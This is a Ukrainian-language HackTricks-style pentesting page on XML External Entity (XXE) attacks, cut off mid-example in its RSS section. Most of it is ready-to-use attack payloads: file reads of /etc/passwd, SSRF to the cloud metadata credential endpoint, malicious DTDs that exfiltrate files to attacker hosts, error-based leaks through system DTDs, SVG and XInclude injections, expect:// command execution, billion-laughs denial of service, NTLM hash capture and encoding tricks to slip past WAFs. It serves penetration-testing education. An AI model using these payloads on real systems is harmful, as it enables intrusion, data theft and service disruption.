# XXE - XEE - XML External Entity

{{#include ../banners/hacktricks-training.md}}

## XML Основи

XML - це мова розмітки, призначена для зберігання та транспортування даних, що має гнучку структуру, яка дозволяє використовувати описово названі теги. Вона відрізняється від HTML тим, що не обмежена набором попередньо визначених тегів. Значення XML зменшилося з появою JSON, незважаючи на її початкову роль у технології AJAX.

- **Представлення даних через сутності**: Сутності в XML дозволяють представляти дані, включаючи спеціальні символи, такі як `&lt;` та `&gt;`, які відповідають `<` та `>` для уникнення конфлікту з системою тегів XML.
- **Визначення елементів XML**: XML дозволяє визначати типи елементів, окреслюючи, як елементи повинні бути структуровані та який вміст вони можуть містити, починаючи від будь-якого типу вмісту до конкретних дочірніх елементів.
- **Визначення типу документа (DTD)**: DTD є важливими в XML для визначення структури документа та типів даних, які він може містити. Вони можуть бути внутрішніми, зовнішніми або комбінацією, вказуючи, як документи формуються та перевіряються.
- **Користувацькі та зовнішні сутності**: XML підтримує створення користувацьких сутностей у DTD для гнучкого представлення даних. Зовнішні сутності, визначені з URL, викликають проблеми безпеки, особливо в контексті атак XML External Entity (XXE), які експлуатують спосіб, яким XML парсери обробляють зовнішні джерела даних: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
- **Виявлення XXE за допомогою параметричних сутностей**: Для виявлення вразливостей XXE, особливо коли звичайні методи не працюють через заходи безпеки парсера, можна використовувати параметричні сутності XML. Ці сутності дозволяють використовувати методи виявлення поза каналом, такі як ініціювання DNS запитів або HTTP запитів до контрольованого домену, для підтвердження вразливості.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Основні атаки

[**Більшість цих атак були протестовані за допомогою чудових лабораторій Portswiggers XEE: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Тест нової сутності

У цій атаці я збираюся перевірити, чи працює проста нова декларація ENTITY.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../images/image (870).png>)

### Читання файлу

Спробуємо прочитати `/etc/passwd` різними способами. Для Windows ви можете спробувати прочитати: `C:\windows\system32\drivers\etc\hosts`

У цьому першому випадку зверніть увагу, що SYSTEM "_**file:///**etc/passwd_" також буде працювати.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../images/image (86).png>)

Цей другий випадок має бути корисним для витягування файлу, якщо веб-сервер використовує PHP (не випадок лабораторій Portswigger)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
У цьому третьому випадку зверніть увагу, що ми оголошуємо `Element stockCheck` як ANY
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../images/image (753).png>)

### Перелік директорій

У **Java**-базованих додатках може бути можливим **перелічити вміст директорії** через XXE з корисним навантаженням, як (просто запитуючи директорію замість файлу):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///"><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE може бути використано для зловживання SSRF всередині хмари
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Використовуючи **раніше згадану техніку**, ви можете змусити сервер отримати доступ до сервера, який ви контролюєте, щоб показати, що він вразливий. Але, якщо це не працює, можливо, це тому, що **XML-ентитети не дозволені**, в такому випадку ви можете спробувати використовувати **XML-параметричні ентитети**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Сліпий" SSRF - Витік даних поза каналом

**У цьому випадку ми змусимо сервер завантажити новий DTD з шкідливим корисним навантаженням, яке надішле вміст файлу через HTTP-запит (для багаторядкових файлів ви можете спробувати витягти його через \_ftp://**\_ використовуючи цей базовий сервер, наприклад [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Це пояснення базується на** [**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind)**.**

У даному шкідливому DTD проводиться серія кроків для витоку даних:

### Приклад шкідливого DTD:

Структура виглядає наступним чином:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Кроки, виконані цим DTD, включають:

1. **Визначення параметричних сутностей:**
- Створюється XML параметрична сутність, `%file`, яка читає вміст файлу `/etc/hostname`.
- Визначається інша XML параметрична сутність, `%eval`. Вона динамічно оголошує нову XML параметричну сутність, `%exfiltrate`. Сутність `%exfiltrate` налаштована на виконання HTTP запиту до сервера атакуючого, передаючи вміст сутності `%file` у рядку запиту URL.
2. **Виконання сутностей:**
- Використовується сутність `%eval`, що призводить до виконання динамічного оголошення сутності `%exfiltrate`.
- Потім використовується сутність `%exfiltrate`, що викликає HTTP запит до вказаного URL з вмістом файлу.

Атакуючий розміщує цей шкідливий DTD на сервері під своїм контролем, зазвичай за URL на кшталт `http://web-attacker.com/malicious.dtd`.

**XXE Payload:** Щоб експлуатувати вразливий додаток, атакуючий надсилає XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Цей payload визначає XML параметричну сутність `%xxe` і включає її в DTD. Коли її обробляє XML парсер, цей payload отримує зовнішній DTD з сервера зловмисника. Парсер потім інтерпретує DTD вбудовано, виконуючи кроки, викладені в зловмисному DTD, що призводить до ексфільтрації файлу `/etc/hostname` на сервер зловмисника.

### Помилка на основі (Зовнішній DTD)

**У цьому випадку ми змусимо сервер завантажити зловмисний DTD, який покаже вміст файлу всередині повідомлення про помилку (це дійсно лише якщо ви можете бачити повідомлення про помилки).** [**Приклад звідси.**](https://portswigger.net/web-security/xxe/blind)

Повідомлення про помилку парсингу XML, яке розкриває вміст файлу `/etc/passwd`, може бути викликане за допомогою зловмисного зовнішнього визначення типу документа (DTD). Це досягається через наступні кроки:

1. Визначається XML параметрична сутність з назвою `file`, яка містить вміст файлу `/etc/passwd`.
2. Визначається XML параметрична сутність з назвою `eval`, що включає динамічне визначення для іншої XML параметричної сутності з назвою `error`. Ця сутність `error`, коли її оцінюють, намагається завантажити неіснуючий файл, використовуючи вміст сутності `file` як своє ім'я.
3. Викликається сутність `eval`, що призводить до динамічного визначення сутності `error`.
4. Виклик сутності `error` призводить до спроби завантажити неіснуючий файл, що генерує повідомлення про помилку, яке включає вміст файлу `/etc/passwd` як частину імені файлу.

Зловмисний зовнішній DTD можна викликати за допомогою наступного XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Після виконання відповідь веб-сервера повинна містити повідомлення про помилку, що відображає вміст файлу `/etc/passwd`.

![](<../images/image (809).png>)

_**Зверніть увагу, що зовнішній DTD дозволяє нам включити одну сутність всередину другого `eval`), але це заборонено в внутрішньому DTD. Тому ви не можете викликати помилку без використання зовнішнього DTD (зазвичай).**_

### **Помилка на основі (системний DTD)**

А що щодо сліпих вразливостей XXE, коли **взаємодії поза каналом заблоковані** (зовнішні з'єднання недоступні)?

Лазівка в специфікації мови XML може **викрити чутливі дані через повідомлення про помилки, коли DTD документа поєднує внутрішні та зовнішні декларації**. Ця проблема дозволяє внутрішнє перевизначення сутностей, оголошених зовні, що полегшує виконання атак XXE на основі помилок. Такі атаки експлуатують перевизначення сутності параметра XML, спочатку оголошеного в зовнішньому DTD, зсередини внутрішнього DTD. Коли з'єднання поза каналом заблоковані сервером, зловмисники повинні покладатися на локальні файли DTD для проведення атаки, намагаючись викликати помилку парсингу, щоб розкрити чутливу інформацію.

Розгляньте сценарій, де файловий простір сервера містить файл DTD за адресою `/usr/local/app/schema.dtd`, що визначає сутність з назвою `custom_entity`. Зловмисник може викликати помилку парсингу XML, розкриваючи вміст файлу `/etc/passwd`, подавши гібридний DTD наступним чином:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file'>">
%eval;
%error;
'>
%local_dtd;
]>
```
Описані кроки виконуються цим DTD:

- Визначення XML параметричної сутності з назвою `local_dtd` включає зовнішній DTD файл, розташований на файловій системі сервера.
- Відбувається повторне визначення для XML параметричної сутності `custom_entity`, спочатку визначеної у зовнішньому DTD, щоб інкапсулювати [експлойт XXE на основі помилок](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Це повторне визначення призначене для викликання помилки парсингу, що відкриває вміст файлу `/etc/passwd`.
- Використовуючи сутність `local_dtd`, залучається зовнішній DTD, що охоплює нововизначену `custom_entity`. Ця послідовність дій призводить до виникнення повідомлення про помилку, яке є метою експлойту.

**Приклад з реального життя:** Системи, що використовують середовище робочого столу GNOME, часто мають DTD за адресою `/usr/share/yelp/dtd/docbookx.dtd`, що містить сутність з назвою `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../images/image (625).png>)

Оскільки ця техніка використовує **внутрішній DTD, спочатку потрібно знайти дійсний**. Ви можете зробити це, **встановивши** ту ж **ОС / програмне забезпечення**, яке використовує сервер, і **шукаючи деякі стандартні DTD**, або **отримавши список** **стандартних DTD** в системах і **перевіривши**, чи існує хоча б один з них:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Для отримання додаткової інформації перевірте [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Пошук DTD у системі

У наступному чудовому репозиторії на github ви можете знайти **шляхи DTD, які можуть бути присутніми в системі**:

{{#ref}}
https://github.com/GoSecure/dtd-finder/tree/master/list
{{#endref}}

Більше того, якщо у вас є **Docker-образ жертви**, ви можете використовувати інструмент з того ж репозиторію, щоб **сканувати** **образ** і **знайти** шлях до **DTD**, що присутні в системі. Прочитайте [Readme репозиторію на github](https://github.com/GoSecure/dtd-finder), щоб дізнатися як.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE через парсери Office Open XML

Для більш детального пояснення цієї атаки, **перегляньте другий розділ** [**цього чудового посту**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **від Detectify**.

Можливість **завантажувати документи Microsoft Office пропонується багатьма веб-додатками**, які потім витягують певні деталі з цих документів. Наприклад, веб-додаток може дозволити користувачам імпортувати дані, завантажуючи електронну таблицю у форматі XLSX. Щоб парсер зміг витягти дані з електронної таблиці, йому обов'язково потрібно буде обробити принаймні один XML файл.

Щоб перевірити цю вразливість, необхідно створити **файл Microsoft Office, що містить XXE payload**. Першим кроком є створення порожньої директорії, в яку документ може бути розпакований.

Після розпакування документа, XML файл, розташований за адресою `./unzipped/word/document.xml`, слід відкрити та відредагувати у вибраному текстовому редакторі (наприклад, vim). XML слід змінити, щоб включити бажаний XXE payload, часто починаючи з HTTP запиту.

Змінені XML рядки слід вставити між двома кореневими XML об'єктами. Важливо замінити URL на моніторинговий URL для запитів.

Нарешті, файл можна знову стиснути, щоб створити шкідливий poc.docx файл. З раніше створеної директорії "unzipped" слід виконати наступну команду:

Тепер створений файл можна завантажити до потенційно вразливого веб-додатку, і можна сподіватися, що запит з'явиться в журналах Burp Collaborator.

### Jar: протокол

Протокол **jar** доступний виключно в **Java додатках**. Він призначений для забезпечення доступу до файлів у **PKZIP** архіві (наприклад, `.zip`, `.jar` тощо), що охоплює як локальні, так і віддалені файли.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
> [!CAUTION]
> Щоб мати можливість отримувати доступ до файлів всередині PKZIP файлів, це **дуже корисно для зловживання XXE через системні DTD файли.** Перегляньте [цей розділ, щоб дізнатися, як зловживати системними DTD файлами](xxe-xee-xml-external-entity.md#error-based-system-dtd).

Процес доступу до файлу в архіві PKZIP через протокол jar включає кілька етапів:

1. Виконується HTTP запит для завантаження zip архіву з вказаного місця, наприклад, `https://download.website.com/archive.zip`.
2. HTTP відповідь, що містить архів, тимчасово зберігається в системі, зазвичай у місці на кшталт `/tmp/...`.
3. Архів потім розпаковується для доступу до його вмісту.
4. Конкретний файл в архіві, `file.zip`, читається.
5. Після операції будь-які тимчасові файли, створені під час цього процесу, видаляються.

Цікава техніка для переривання цього процесу на другому етапі полягає в тому, щоб підтримувати з'єднання з сервером відкритим безкінечно під час обслуговування архівного файлу. Інструменти, доступні в [цьому репозиторії](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution), можуть бути використані для цієї мети, включаючи Python сервер (`slow_http_server.py`) та Java сервер (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
> [!CAUTION]
> Запис файлів у тимчасовий каталог може допомогти **ескалації іншої вразливості, що пов'язана з обходом шляху** (такою як включення локальних файлів, ін'єкція шаблонів, XSLT RCE, десеріалізація тощо).

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Атака мільйона сміхів
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml Attack
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Атака квадратичного вибуху

![](<../images/image (527).png>)

#### Отримання NTML

На хостах Windows можливо отримати NTML хеш користувача веб-сервера, налаштувавши обробник responder.py:
```bash
Responder.py -I eth0 -v
```
і надіславши наступний запит
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Тоді ви можете спробувати зламати хеш за допомогою hashcat

## Сховані XXE Поверхні

### XInclude

При інтеграції даних клієнта в XML-документи на стороні сервера, такі як ті, що в бекенд SOAP запитах, прямий контроль над структурою XML часто обмежений, що ускладнює традиційні XXE атаки через обмеження на зміну елемента `DOCTYPE`. Однак атака `XInclude` пропонує рішення, дозволяючи вставку зовнішніх сутностей у будь-який елемент даних XML-документа. Цей метод ефективний навіть тоді, коли можна контролювати лише частину даних у згенерованому сервером XML-документі.

Щоб виконати атаку `XInclude`, необхідно оголосити простір імен `XInclude`, а також вказати шлях до файлу для запланованої зовнішньої сутності. Нижче наведено стисле приклад того, як така атака може бути сформульована:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Перевірте [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) для отримання додаткової інформації!

### SVG - Завантаження файлів

Файли, завантажені користувачами до певних додатків, які потім обробляються на сервері, можуть експлуатувати вразливості в тому, як обробляються XML або формати файлів, що містять XML. Загальні формати файлів, такі як офісні документи (DOCX) та зображення (SVG), базуються на XML.

Коли користувачі **завантажують зображення**, ці зображення обробляються або перевіряються на стороні сервера. Навіть для додатків, які очікують формати, такі як PNG або JPEG, **бібліотека обробки зображень сервера також може підтримувати зображення SVG**. SVG, будучи форматом на основі XML, може бути використаний зловмисниками для подання шкідливих SVG зображень, тим самим піддаючи сервер вразливостям XXE (XML External Entity).

Приклад такого експлуатації показано нижче, де шкідливе SVG зображення намагається прочитати системні файли:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Інший метод полягає в спробі **виконати команди** через обгортку PHP "expect":
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
У обох випадках формат SVG використовується для запуску атак, які експлуатують можливості обробки XML програмного забезпечення сервера, підкреслюючи необхідність надійної валідації введення та заходів безпеки.

Перевірте [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) для отримання додаткової інформації!

**Зверніть увагу, що перший рядок зчитаного файлу або результат виконання з'явиться ВНУТРІ створеного зображення. Тому вам потрібно мати доступ до зображення, яке створив SVG.**

### **PDF - Завантаження файлу**

Прочитайте наступний пост, щоб **дізнатися, як експлуатувати XXE, завантажуючи PDF** файл:

{{#ref}}
file-upload/pdf-upload-xxe-and-cors-bypass.md
{{#endref}}

### Content-Type: Від x-www-urlencoded до XML

Якщо POST-запит приймає дані у форматі XML, ви можете спробувати експлуатувати XXE у цьому запиті. Наприклад, якщо звичайний запит містить наступне:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Тоді ви, можливо, зможете надіслати наступний запит з тим же результатом:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Від JSON до XEE

Щоб змінити запит, ви можете використовувати розширення Burp під назвою “**Content Type Converter**“. [Тут](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) ви можете знайти цей приклад:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Ще один приклад можна знайти [here](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & обхід захистів

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Це працює лише в тому випадку, якщо XML сервер приймає протокол `data://`.

### UTF-7

Ви можете використовувати \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/index.html#recipe=Encode_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/index.html#recipe=Encode_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) для перетворення в UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protocol Bypass

Якщо веб використовує PHP, замість використання `file:/` ви можете використовувати **php wrappers**`php://filter/convert.base64-encode/resource=` для **доступу до внутрішніх файлів**.

Якщо веб використовує Java, ви можете перевірити [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

Трюк з [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Ви можете створити **сущність всередині сущності**, закодувавши її за допомогою **html entities** і потім викликати її для **завантаження dtd**.\
Зверніть увагу, що використані **HTML Entities** повинні бути **числовими** (як \[в цьому прикладі]\([https://gchq.github.io/CyberChef/index.html#recipe=To_HTML_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](<https://gchq.github.io/CyberChef/index.html#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C>)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "<&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD приклад:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**Витягти** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Витягти зовнішній ресурс**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Віддалене виконання коду

**Якщо модуль PHP "expect" завантажено**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Цей приклад натхненний [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) використовується для стандартизації обміну даними в процесах локалізації. Це формат на основі XML, який в основному використовується для передачі локалізованих даних між інструментами під час локалізації та як загальний формат обміну для інструментів CAT (Computer-Aided Translation).

### Blind Request Analysis

Запит надсилається на сервер з наступним вмістом:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Однак цей запит викликає внутрішню помилку сервера, зокрема згадуючи про проблему з деклараціями розмітки:
```json
{
"status": 500,
"error": "Internal Server Error",
"message": "Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."
}
```
Незважаючи на помилку, на Burp Collaborator зафіксовано запит, що вказує на певний рівень взаємодії з зовнішнім об'єктом.

Витік даних поза каналом Щоб витягти дані, надсилається модифікований запит:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Цей підхід показує, що User Agent вказує на використання Java 1.8. Відзначеною обмеженням цієї версії Java є неможливість отримати файли, що містять символ нового рядка, такі як /etc/passwd, використовуючи техніку Out of Band.

Витік даних на основі помилок Щоб подолати це обмеження, використовується підхід на основі помилок. Файл DTD структурований наступним чином, щоб викликати помилку, яка включає дані з цільового файлу:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Сервер відповідає з помилкою, важливо відображаючи неіснуючий файл, що вказує на те, що сервер намагається отримати доступ до вказаного файлу:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Щоб включити вміст файлу в повідомлення про помилку, DTD файл налаштовується:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Ця модифікація призводить до успішної ексфільтрації вмісту файлу, оскільки це відображається в виході помилки, надісланому через HTTP. Це вказує на успішну атаку XXE (XML External Entity), що використовує як Out of Band, так і Error-Based техніки для витягнення чутливої інформації.

## RSS - XEE

Дійсний XML у форматі RSS для експлуатації вразливості XXE.

### Ping back

Простий HTTP запит до сервера атакуючого
```xml
<?xml version="1.0" encoding="UTF-8"?>
